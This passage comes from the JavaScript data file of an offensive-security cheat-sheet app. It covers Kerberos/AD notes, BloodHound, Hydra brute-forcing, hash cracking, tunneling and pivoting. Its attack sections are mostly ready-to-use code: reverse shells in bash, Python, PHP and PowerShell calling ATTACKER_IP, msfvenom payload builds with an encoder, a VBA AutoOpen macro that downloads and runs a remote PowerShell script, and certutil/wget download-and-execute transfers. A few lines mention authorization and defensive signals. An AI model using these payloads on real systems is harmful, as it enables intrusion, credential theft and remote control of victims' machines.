      /* 17. RBCD */
      {
        heading: "17. Resource-Based Constrained Delegation",
        level: 2,
        content: "Backend stores:",
        code: "msDS-AllowedToActOnBehalfOfOtherIdentity",
      },
      {
        content: "Access controlled by ACL.\nNo domain admin required if write permissions exist.\nCommon privilege escalation path."
      },

      /* 18. Protected Users Group */
      {
        heading: "18. Protected Users Group",
        level: 2,
        content: "Restrictions:",
        list: [
          "No NTLM",
          "No DES/RC4",
          "No delegation",
          "TGT lifetime 4 hours"
        ]
      },
      {
        content: "Mitigates ticket abuse."
      },

      /* 19. Authentication vs Authorization */
      {
        heading: "19. Authentication vs Authorization",
        level: 2,
        content: "Kerberos authenticates identity.\nPAC provides authorization data.\nWindows access token enforces authorization."
      },

      /* 20. Domain Functional Level Impact */
      {
        heading: "20. Domain Functional Level Impact",
        level: 2,
        content: "Higher functional levels:",
        list: [
          "AES default",
          "Improved PAC",
          "RBCD support",
          "Claims support"
        ]
      },

      /* 21. KRBTGT Rotation */
      {
        heading: "21. KRBTGT Rotation",
        level: 2,
        content: "Golden tickets remain valid until KRBTGT password rotated twice.\n\nDouble reset required because: Previous password hash retained temporarily."
      },

      /* 22. Hardening Model */
      {
        heading: "22. Hardening Model",
        level: 2,
        list: [
          "Disable RC4",
          "Enforce AES",
          "Rotate KRBTGT periodically",
          "Remove unconstrained delegation",
          "Monitor 4769 events",
          "Restrict MachineAccountQuota",
          "Set sensitive accounts non-delegable",
          "Enable Credential Guard",
          "Audit SPN changes"
        ]
      }
    ]
  },

  {
    id: "bloodhound",
    title: "BloodHound",
    category: "Active Directory",
    icon: "🩸",
    sections: [
      {
        heading: "Collection",
        level: 2,
        code: "# Python collector\nbloodhound-python -c All -u USER -p PASS -d DOMAIN -ns DC_IP\n\n# SharpHound on Windows target\n.\\SharpHound.exe -c All"
      },
      {
        heading: "Neo4j / Import",
        level: 2,
        code: "sudo neo4j start\n# Open BloodHound GUI/CE and upload collection ZIP"
      },
      {
        heading: "High-Value Queries",
        level: 2,
        list: [
          "Shortest Paths to Domain Admins",
          "Kerberoastable users",
          "AS-REP roastable users",
          "Owned principals to high-value targets",
          "Outbound object control / ACL abuse paths"
        ]
      },
      {
        heading: "Practical Notes",
        level: 2,
        content: "Re-run collection after privilege changes; graph paths become stale quickly after password resets, group membership changes, or delegation updates."
      }
    ]
  },

  {
    id: "hydra_bruteforce",
    title: "Bruteforcing with Hydra",
    category: "Credential Attacks",
    icon: "🔓",
    sections: [
      {
        heading: "Hydra Basics",
        level: 2,
        content: "Hydra performs online credential guessing against many protocols. Keep thread count and request rate controlled to avoid lockouts.",
        code: "hydra -l admin -P passwords.txt ssh://10.10.10.10"
      },
      {
        heading: "Common Protocol Examples",
        level: 2,
        code: "# SSH\nhydra -L users.txt -P pass.txt -t 4 ssh://10.10.10.10\n\n# RDP\nhydra -L users.txt -P pass.txt rdp://10.10.10.20\n\n# FTP\nhydra -l ftp -P pass.txt ftp://10.10.10.30\n\n# SMB\nhydra -L users.txt -P pass.txt smb://10.10.10.40"
      },
      {
        heading: "HTTP Forms",
        level: 2,
        content: "For web logins, define request path, body parameters, and fail condition string.",
        code: "hydra -L users.txt -P pass.txt 10.10.10.50 http-post-form \"/login.php:username=^USER^&password=^PASS^:F=Invalid credentials\""
      },
      {
        heading: "Safe Usage Checklist",
        level: 2,
        list: [
          "Validate account lockout policy first",
          "Use low thread count (-t 2 to -t 6) on production-like targets",
          "Use known username list quality over huge random lists",
          "Log successful credentials immediately with timestamp and service"
        ]
      }
    ]
  },

  {
    id: "hash_cracking",
    title: "Hash Cracking",
    category: "Credential Attacks",
    icon: "🧪",
    sections: [
      {
        heading: "Identification First",
        level: 2,
        content: "Correctly identify hash type before cracking. Wrong mode wastes time and gives false negatives.",
        code: "# Quick identification\nhashid <hash>\n\n# Extract hash material from dumps before cracking\n# (NTLM, Kerberos TGS, AS-REP, bcrypt, etc.)"
      },
      {
        heading: "Hashcat Examples",
        level: 2,
        code: "# NTLM (mode 1000)\nhashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# Kerberos 5 TGS-REP etype 23 (Kerberoast)\nhashcat -m 13100 -a 0 kerberoast.txt wordlist.txt\n\n# Show cracked creds\nhashcat -m 1000 hashes.txt --show"
      },
      {
        heading: "John the Ripper Examples",
        level: 2,
        code: "# Generic wordlist mode\njohn --wordlist=wordlist.txt hashes.txt\n\n# Incremental mode (slow, broad)\njohn --incremental hashes.txt\n\n# Show results\njohn --show hashes.txt"
      },
      {
        heading: "Rule-Based Attacks",
        level: 2,
        content: "Prefer targeted rules and org-specific words over huge blind brute-force.",
        code: "# Hashcat with rules\nhashcat -m 1000 -a 0 hashes.txt base_words.txt -r /usr/share/hashcat/rules/best64.rule"
      },
      {
        heading: "Operational Practices",
        level: 2,
        list: [
          "Track source and timestamp for each hash set",
          "Separate cracked credentials by system/domain",
          "Prioritize privileged/service accounts first",
          "Immediately validate cracked creds carefully to avoid lockouts"
        ]
      }
    ]
  },

  {
    id: "common_reverse_shells",
    title: "Common Reverse Shells",
    category: "Shell Operations",
    icon: "🐚",
    sections: [
      {
        heading: "Bash",
        level: 2,
        code: "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
      },
      {
        heading: "Python",
        level: 2,
        code: "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
      },
      {
        heading: "PHP",
        level: 2,
        code: "php -r '$sock=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
      },
      {
        heading: "PowerShell",
        level: 2,
        code: "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
      }
    ]
  },

  {
    id: "reverse_shell_listeners",
    title: "Reverse Shell Listener Setup",
    category: "Shell Operations",
    icon: "🎧",
    sections: [
      {
        heading: "Netcat / Ncat",
        level: 2,
        code: "# Traditional netcat listener\nnc -lvnp 4444\n\n# Ncat with verbose output\nncat -lvnp 4444"
      },
      {
        heading: "rlwrap + nc",
        level: 2,
        content: "Use rlwrap for better line editing/history for unstable shells.",
        code: "rlwrap -cAr nc -lvnp 4444"
      },
      {
        heading: "Metasploit multi/handler",
        level: 2,
        code: "use exploit/multi/handler\nset payload linux/x64/shell_reverse_tcp\nset LHOST 10.10.14.5\nset LPORT 4444\nrun"
      },
      {
        heading: "Common Listener Pitfalls",
        level: 2,
        list: [
          "Wrong LHOST (use reachable interface/VPN IP)",
          "Firewall blocks inbound listener port",
          "Payload architecture mismatch",
          "NAT or split tunnel issues"
        ]
      }
    ]
  },

  {
    id: "shell_stabilization",
    title: "Shell Stabilization",
    category: "Shell Operations",
    icon: "🛠️",
    sections: [
      {
        heading: "PTY Upgrade",
        level: 2,
        code: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Ctrl+Z\nstty raw -echo; fg\nreset\nexport TERM=xterm-256color\nstty rows 50 cols 180"
      },
      {
        heading: "Quality-of-Life",
        level: 2,
        list: [
          "Set TERM and stty dimensions",
          "Use rlwrap on listener side",
          "Switch to bash if /bin/sh is limited",
          "Use script command when available: script -qc /bin/bash /dev/null"
        ]
      }
    ]
  },

  {
    id: "msfvenom_payloads",
    title: "msfvenom Payloads",
    category: "Payload Development",
    icon: "💣",
    sections: [
      {
        heading: "Linux / Windows Basics",
        level: 2,
        code: "# Linux ELF reverse TCP\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell.elf\n\n# Windows x64 exe reverse TCP\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe"
      },
      {
        heading: "Web Payloads",
        level: 2,
        code: "# PHP reverse shell payload\nmsfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.php\n\n# ASPX payload\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f aspx -o shell.aspx"
      },
      {
        heading: "Encoders / Badchars",
        level: 2,
        content: "Only use encoders when required by payload constraints; they are not AV bypass magic.",
        code: "msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -b '\\x00\\x0a\\x0d' -e x86/shikata_ga_nai -i 3 -f exe -o shell_enc.exe"
      }
    ]
  },

  {
    id: "malicious_macros",
    title: "Malicious Macros",
    category: "Initial Access",
    icon: "📄",
    sections: [
      {
        heading: "What to Know",
        level: 2,
        content: "Macro-enabled documents (VBA) are a common initial-access vector in phishing simulations and red-team labs. Modern Office protections reduce success rate, so operator tradecraft and environment context matter."
      },
      {
        heading: "Minimal VBA Execution Pattern",
        level: 2,
        code: "Sub AutoOpen()\n    Dim cmd As String\n    cmd = \"powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/a.ps1')\"\n    CreateObject(\"Wscript.Shell\").Run cmd, 0\nEnd Sub"
      },
      {
        heading: "Common Delivery Notes",
        level: 2,
        list: [
          "Use macro-enabled formats (.docm/.xlsm)",
          "Test in isolated lab mail and endpoint stack first",
          "Host staged payloads on controlled infrastructure",
          "Plan fallback methods if VBA is blocked by policy"
        ]
      },
      {
        heading: "Defensive Signals (for reporting)",
        level: 2,
        list: [
          "Office spawning script interpreters (powershell/cmd/wscript)",
          "Suspicious outbound callbacks after document open",
          "Encoded command lines and hidden window flags",
          "Macro execution events in Office and endpoint telemetry"
        ]
      },
      {
        heading: "Engagement Safety",
        level: 2,
        content: "Only use macro testing with explicit authorization and scope. Prefer simulation payloads/non-destructive commands during validation and capture IOC details for blue-team handoff."
      }
    ]
  },

  {
    id: "buffer_overflows",
    title: "Buffer Overflows",
    category: "Binary Exploitation",
    icon: "🧩",
    sections: [
      {
        heading: "Core Workflow",
        level: 2,
        numbered: true,
        list: [
          "Fuzz input length until crash",
          "Find exact offset to instruction pointer overwrite",
          "Control EIP/RIP with test pattern",
          "Identify bad characters",
          "Find stable JMP/RET or equivalent control flow primitive",
          "Generate shellcode or use ROP chain depending on mitigations",
          "Build final exploit and validate reliability"
        ]
      },
      {
        heading: "Quick Offset + EIP Control (32-bit style)",
        level: 2,
        code: "# Create a pattern (Metasploit)\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000\n\n# After crash, calculate offset\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138\n\n# Verify control\npython3 - << 'PY'\noffset = 524\npayload = b'A' * offset + b'BBBB' + b'C' * 200\nprint(payload)\nPY"
      },
      {
        heading: "Mitigation Awareness",
        level: 2,
        list: [
          "ASLR randomizes addresses (prefer leaks / brute-force only in labs)",
          "DEP/NX blocks stack execution (ROP or ret2libc required)",
          "Stack canaries detect overwrite before return",
          "PIE randomizes module base addresses",
          "Modern targets often require info leak + ROP chain"
        ]
      },
      {
        heading: "Lab Notes",
        level: 2,
        content: "Do this only in authorized labs/CTFs. Keep exploit scripts deterministic and log exact target binary hash/build for reproducibility."
      }
    ]
  },

  {
    id: "file_transfers",
    title: "File Transfers",
    category: "Operations",
    icon: "📦",
    sections: [
      {
        heading: "HTTP-based",
        level: 2,
        code: "# Attacker host files\npython3 -m http.server 8000\n\n# Linux target download\nwget http://ATTACKER_IP:8000/tool -O /tmp/tool\ncurl http://ATTACKER_IP:8000/tool -o /tmp/tool\n\n# Windows target download\ncertutil -urlcache -split -f http://ATTACKER_IP:8000/tool.exe tool.exe\npowershell -c \"iwr http://ATTACKER_IP:8000/tool.exe -OutFile tool.exe\""
      },
      {
        heading: "Netcat / Socat",
        level: 2,
        code: "# Sender (attacker)\nnc -lvnp 9002 < linpeas.sh\n\n# Receiver (target)\nnc ATTACKER_IP 9002 > /tmp/linpeas.sh"
      },
      {
        heading: "SMB / SCP",
        level: 2,
        code: "# SCP upload\nscp file.txt user@target:/tmp/file.txt\n\n# SCP download\nscp user@target:/tmp/loot.txt ./loot.txt"
      },
      {
        heading: "When Downloads Are Blocked",
        level: 2,
        list: [
          "Use base64 chunking + decode on target",
          "Leverage existing admin tools (certutil, bitsadmin, powershell iwr)",
          "Rename binaries/extensions if filtering is extension-based",
          "Validate hashes after transfer to avoid corrupted tooling"
        ]
      }
    ]
  },

  {
    id: "tunneling_options",
    title: "Tunneling & Pivoting",
    category: "Post-Exploitation",
    icon: "🛰️",
    sections: [
      {
        heading: "Overview",
        level: 2,
        content: "Use tunneling/pivoting when your foothold can reach internal services your attack box cannot. Pick the tool based on whether you need a single forwarded port, a SOCKS proxy, or full subnet routing.\n\nPivoting converts a compromised host into a relay for deeper network access. The tool choice depends on the protocols available, detection risk, and whether you need single-port forwarding, a SOCKS proxy, or full TUN-level subnet routing."
      },

      /* ── SSH Tunneling ── */
      {
        heading: "SSH Tunneling",
        level: 2,
        content: "SSH is the most common pivot mechanism on Linux hosts. Four main modes:"
      },
      {
        heading: "Local Port Forward (-L)",
        level: 3,
        content: "Expose a remote internal service on your local machine. Traffic flows: your localhost → SSH server → target.",
        code: "# Access internal RDP through jump host\nssh -L 3389:10.10.20.15:3389 user@jump-host\n\n# Access internal web app\nssh -L 8080:172.16.0.50:80 user@jump-host\n\n# Then connect locally:\nrdesktop 127.0.0.1:3389\ncurl http://127.0.0.1:8080"
      },
      {
        heading: "Remote Port Forward (-R)",
        level: 3,
        content: "Expose your local service on the remote side. Useful for getting callbacks from internal hosts.",
        code: "# Make your local port 80 accessible on jump host port 8080\nssh -R 8080:127.0.0.1:80 user@jump-host\n\n# Make your listener reachable inside the network\nssh -R 4444:127.0.0.1:4444 user@jump-host"
      },
      {
        heading: "Dynamic SOCKS Proxy (-D)",
        level: 3,
        content: "Creates a SOCKS4/5 proxy. Route arbitrary traffic through proxychains.",
        code: "# Create SOCKS proxy on local port 1080\nssh -D 1080 user@jump-host\n\n# Configure /etc/proxychains4.conf:\n#   socks5 127.0.0.1 1080\n\n# Then use any tool through the proxy:\nproxychains nmap -sT -Pn 10.10.20.0/24\nproxychains curl http://172.16.0.50\nproxychains evil-winrm -i 10.10.20.15 -u admin -p pass"
      },
      {
        heading: "Remote Dynamic SOCKS (-R with SOCKS)",
        level: 3,
        content: "Opens a SOCKS proxy on the remote host. Useful when you have outbound SSH from victim but need inbound routing from the victim side.",
        code: "# From victim (reverse dynamic proxy)\nssh -R 1080 attacker@ATTACKER_IP\n\n# On attacker: proxychains now routes through victim\nproxychains nmap -sT -Pn 10.10.20.0/24"
      },
      {
        heading: "SSH Tunneling Tips",
        level: 3,
        list: [
          "Add -N (no shell) and -f (background) for clean tunnel sessions: ssh -N -f -D 1080 user@host",
          "Use -o StrictHostKeyChecking=no in lab environments to avoid prompts",
          "Stack multiple -L flags for forwarding several ports at once",
          "Use ~/.ssh/config entries to simplify repeated tunnel commands",
          "Check for SSH keys on compromised hosts: find / -name id_rsa 2>/dev/null"
        ]
      },

      /* ── Chisel ── */
      {
        heading: "Chisel",
        level: 2,
        content: "HTTP/WebSocket-based tunnel tool. Works where SSH is blocked but HTTP/HTTPS is allowed. Single binary, cross-platform."
      },
      {
        heading: "Reverse SOCKS Proxy",
        level: 3,
        content: "Most common chisel pattern — victim connects back to attacker and opens a SOCKS proxy.",
        code: "# Attacker: start chisel server\nchisel server --reverse -p 8000\n\n# Victim: connect back, open reverse SOCKS\nchisel client ATTACKER_IP:8000 R:socks\n\n# Attacker: SOCKS5 proxy is now on 127.0.0.1:1080\n# Configure proxychains:\n#   socks5 127.0.0.1 1080\nproxychains nmap -sT -Pn 10.10.20.0/24"
      },
      {
        heading: "Port Forwarding",
        level: 3,
        content: "Forward specific ports instead of full SOCKS.",
        code: "# Forward victim's internal 172.16.0.50:80 to attacker's localhost:8080\n# Attacker\nchisel server --reverse -p 8000\n# Victim\nchisel client ATTACKER_IP:8000 R:8080:172.16.0.50:80\n\n# Attacker can now access: curl http://127.0.0.1:8080"
      },
      {
        heading: "FoxyProxy Configuration",
        level: 3,
        content: "Configure FoxyProxy in your browser to use the chisel SOCKS proxy for web-based internal access.",
        list: [
          "Install FoxyProxy extension in Firefox",
          "Add proxy: SOCKS5, 127.0.0.1, port 1080",
          "Set pattern matching for internal IP ranges (10.*, 172.16.*, 192.168.*)",
          "Enable the profile — browser traffic matching those ranges routes through chisel"
        ]
      },
      {
        heading: "Windows Chisel Usage",
        level: 3,
        code: "# Transfer chisel.exe to victim (certutil, PowerShell, etc.)\ncertutil -urlcache -f http://ATTACKER_IP/chisel.exe C:\\Windows\\Temp\\chisel.exe\n\n# Run on victim\nC:\\Windows\\Temp\\chisel.exe client ATTACKER_IP:8000 R:socks"
      },

      /* ── Ligolo-ng ── */
      {
        heading: "Ligolo-ng",
        level: 2,
        content: "High-performance TUN-based pivoting. Creates a virtual network interface for clean IP-level routing. No SOCKS/proxychains needed — tools work natively."
      },
      {
        heading: "Basic Setup",
        level: 3,
        code: "# Attacker: create TUN interface and start proxy\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601\n\n# Victim: run agent\n./agent -connect ATTACKER_IP:11601 -ignore-cert"
      },
      {
        heading: "Route Internal Subnets",
        level: 3,
        content: "Once agent connects, select it in the ligolo console and add routes.",
        code: "# In ligolo proxy console:\n» session              # select the agent session\n» ifconfig             # view victim's network interfaces\n» start                # start the tunnel\n\n# On attacker (separate terminal), add route:\nsudo ip route add 10.10.20.0/24 dev ligolo\n\n# Now access internal hosts DIRECTLY (no proxychains):\nnmap -sT -Pn 10.10.20.10\nevil-winrm -i 10.10.20.15 -u admin -p pass\ncurl http://10.10.20.50"
      },
      {
        heading: "Listeners (Reverse Shells Through Tunnel)",
        level: 3,
        content: "Create listeners on the agent side so internal hosts can connect back to you through the tunnel.",
        code: "# In ligolo console — add a listener\n» listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp\n\n# This makes the victim listen on 4444 and forward to your local 4444\n# Set up your listener locally:\nnc -lvnp 4444\n\n# Trigger reverse shell on internal host pointing to victim's IP:4444\n# The shell arrives at your local nc listener"
      },
      {
        heading: "Double Pivot (Multi-Hop)",
        level: 3,
        content: "Chain through multiple networks by running agent on a second-hop victim.",
        code: "# After setting up first tunnel to 10.10.20.0/24:\n# 1. Transfer agent to second-hop host (10.10.20.50)\n# 2. Create listener on first agent for ligolo port:\n»  listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp\n# 3. Run agent on second-hop host:\n./agent -connect 10.10.20.1:11601 -ignore-cert\n# 4. Create second TUN interface and route:\nsudo ip tuntap add user $(whoami) mode tun ligolo2\nsudo ip link set ligolo2 up\n# 5. Select new session, start tunnel, add route:\nsudo ip route add 172.16.0.0/24 dev ligolo2"
      },
      {
        heading: "Cleanup",
        level: 3,
        code: "# Remove routes and interfaces after engagement\nsudo ip route del 10.10.20.0/24 dev ligolo\nsudo ip link set ligolo down\nsudo ip tuntap del mode tun ligolo"
      },

      /* ── Other Pivoting Tools ── */
      {
        heading: "socat",
        level: 2,
        content: "Simple TCP/UDP relay tool. Great for quick port forwards and ad-hoc relays.",
        code: "# Forward local port 8443 to internal 10.10.10.20:443\nsocat TCP-LISTEN:8443,fork TCP:10.10.10.20:443\n\n# Reverse relay: victim connects back to attacker\n# Attacker\nsocat TCP-LISTEN:9001,fork -\n# Victim\nsocat TCP:ATTACKER_IP:9001 TCP:127.0.0.1:3306\n\n# Encrypted relay with OpenSSL\nsocat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:10.10.10.20:80"
      },
      {
        heading: "sshuttle",
        level: 2,
        content: "User-space VPN-style pivot over SSH. No SOCKS needed — transparent subnet routing.",
        code: "# Route 10.10.0.0/16 through SSH host\nsshuttle -r user@jump-host 10.10.0.0/16\n\n# Include DNS through tunnel\nsshuttle --dns -r user@jump-host 10.10.0.0/16\n\n# Exclude specific subnets\nsshuttle -r user@jump-host 10.10.0.0/16 -x 10.10.1.0/24\n\n# Use with SSH key\nsshuttle -r user@jump-host --ssh-cmd 'ssh -i /path/to/key' 10.10.0.0/16"
      },
      {
        heading: "plink.exe (Windows SSH)",
        level: 2,
        content: "PuTTY command-line SSH client for Windows pivoting when native SSH is unavailable.",
        code: "# Local port forward from Windows victim\nplink.exe -ssh -l user -pw password -L 3389:10.10.20.15:3389 jump-host\n\n# Dynamic SOCKS from Windows\nplink.exe -ssh -l user -pw password -D 1080 jump-host\n\n# Remote port forward\nplink.exe -ssh -l user -pw password -R 8080:127.0.0.1:80 ATTACKER_IP"
      },
      {
        heading: "netsh (Windows Built-in)",
        level: 2,
        content: "Windows native port forwarding — no tools to upload, but requires admin privileges.",
        code: "# Add port forward: listen on 8080, forward to internal 10.10.20.15:80\nnetsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.20.15\n\n# List all forwards\nnetsh interface portproxy show all\n\n# Remove forward\nnetsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0\n\n# Open firewall for the listening port\nnetsh advfirewall firewall add rule name=\"pivot\" dir=in action=allow protocol=tcp localport=8080"
      },
      {
        heading: "Operational Notes",
        level: 2,
        list: [
          "Start with the least noisy tunnel that satisfies the objective",
          "Document which host/credential each tunnel depends on — tunnels break when shells die",
          "Kill stale forwards after use to reduce detection surface",
          "Prefer encrypted channels (SSH/chisel TLS/ligolo) when possible",
          "Test connectivity through the tunnel before running heavy scans",
          "For double pivots: ligolo-ng is king — SOCKS-over-SOCKS is painful",
          "Always have a fallback tunnel method in case the primary is detected/killed"
        ]
      }
    ]
  }
];
